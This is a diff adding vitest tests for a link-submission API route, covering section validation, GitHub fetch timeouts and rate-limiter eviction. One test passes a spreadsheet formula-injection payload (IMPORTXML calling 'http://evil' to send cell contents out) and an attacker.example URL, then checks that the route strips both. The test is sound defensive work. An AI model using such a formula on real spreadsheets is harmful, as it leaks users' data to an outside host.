@@ -1,5 +1,5 @@
 import { afterEach, describe, expect, it, vi } from 'vitest';
-import { POST } from './route';
+import { POST, __rateLimiterSizeForTests } from './route';
 
 // Each test gets its own client IP — the route's rate limiter is a module-
 // level Map keyed by IP, and would otherwise leak state between test cases.
@@ -41,6 +41,51 @@ describe('POST /api/submit-link', () => {
   it('rejects a missing section with 400', async () => {
     const res = await POST(req({ url: 'https://reddit.com/r/x' }, '10.0.0.3'));
     expect(res.status).toBe(400);
+  });
+
+  it('rejects a section outside the community/merch enum with 400', async () => {
+    const fetchSpy = vi.fn();
+    vi.stubGlobal('fetch', fetchSpy);
+    const res = await POST(req({ url: 'https://reddit.com/r/x', section: 'clowning' }, '10.0.0.30'));
+    expect(res.status).toBe(400);
+    expect(fetchSpy).not.toHaveBeenCalled();
+  });
+
+  it.each(['community', 'merch'])('accepts the %s section', async (section) => {
+    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
+    vi.stubGlobal(
+      'fetch',
+      vi.fn().mockResolvedValue(new Response(JSON.stringify({ number: 1 }), { status: 201 })),
+    );
+    const res = await POST(req({ url: 'https://reddit.com/r/x', section }, `10.0.0.${section}`));
+    expect(res.status).toBe(200);
+  });
+
+  it('ignores a note/sourcePage in the request body — they are not a supported input', async () => {
+    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
+    const fetchSpy = vi.fn().mockResolvedValue(
+      new Response(JSON.stringify({ number: 9, html_url: 'http://gh/9' }), { status: 201 }),
+    );
+    vi.stubGlobal('fetch', fetchSpy);
+
+    const res = await POST(
+      req(
+        {
+          url: 'https://reddit.com/r/x',
+          section: 'community',
+          note: '=IMPORTXML("http://evil/?"&JOIN(",",A1:A9),"//a")',
+          sourcePage: 'https://attacker.example',
+        },
+        '10.0.0.31',
+      ),
+    );
+    expect(res.status).toBe(200);
+
+    const [, init] = fetchSpy.mock.calls[0];
+    const sent = JSON.parse(init.body as string);
+    expect(sent.body).not.toContain('IMPORTXML');
+    expect(sent.body).not.toContain('attacker.example');
+    expect(sent.body).toContain('/community');
   });
 
   it('drops honeypot submissions silently (200, nothing written)', async () => {
@@ -111,5 +156,64 @@ describe('POST /api/submit-link', () => {
     expect(res.status).toBe(200);
     expect(await res.json()).toMatchObject({ ok: true });
     expect(fetchSpy).not.toHaveBeenCalled();
+  });
+
+  it('still returns 200 within the timeout when the always-on GitHub fetch hangs', async () => {
+    vi.useFakeTimers();
+    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
+    vi.stubGlobal(
+      'fetch',
+      vi.fn((_url: string, init?: RequestInit) => {
+        return new Promise((_resolve, reject) => {
+          init?.signal?.addEventListener('abort', () => {
+            reject(new DOMException('The operation was aborted.', 'AbortError'));
+          });
+        });
+      }),
+    );
+
+    const promise = POST(req({ url: 'https://reddit.com/r/x', section: 'community' }, '10.0.0.9'));
+    await vi.advanceTimersByTimeAsync(5100);
+    const res = await promise;
+
+    expect(res.status).toBe(200);
+    expect(await res.json()).toMatchObject({ ok: true });
+    vi.useRealTimers();
+  });
+
+  it('evicts stale IPs from the rate limiter map instead of growing it forever', async () => {
+    vi.useFakeTimers();
+    // Pin the fake clock to the real current time — the limiter's internal
+    // `lastSweep` was recorded with the real Date.now() at module load, and
+    // the sweep-due check compares against it, so the fake clock's starting
+    // point has to agree with that rather than default to the epoch.
+    vi.setSystemTime(new Date());
+    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
+    vi.stubGlobal(
+      'fetch',
+      vi.fn().mockResolvedValue(new Response(JSON.stringify({ number: 1 }), { status: 201 })),
+    );
+
+    // 20 distinct one-off IPs, one hit each — under the burst limit, so
+    // nothing 429s, but each adds a key to the limiter's internal map.
+    // Measured relative to whatever the map already holds from earlier
+    // tests in this file (the map is module-level and not reset per test).
+    const before = __rateLimiterSizeForTests();
+    for (let i = 0; i < 20; i += 1) {
+      // eslint-disable-next-line no-await-in-loop
+      await POST(req({ url: `https://reddit.com/r/x?i=${i}`, section: 'community' }, `10.2.0.${i}`));
+    }
+    expect(__rateLimiterSizeForTests()).toBe(before + 20);
+
+    // Advance past both the rate-limit window and the sweep interval, then
+    // send one more request. Every entry present up to that point (the
+    // pre-existing ones and the 20 just added) is now older than the
+    // window, so the sweep this request triggers should drop all of them,
+    // leaving only the one this final request itself just added.
+    vi.advanceTimersByTime(6 * 60_000);
+    await POST(req({ url: 'https://reddit.com/r/x?final=1', section: 'community' }, '10.2.0.99'));
+    expect(__rateLimiterSizeForTests()).toBe(1);
+
+    vi.useRealTimers();
   });
 });
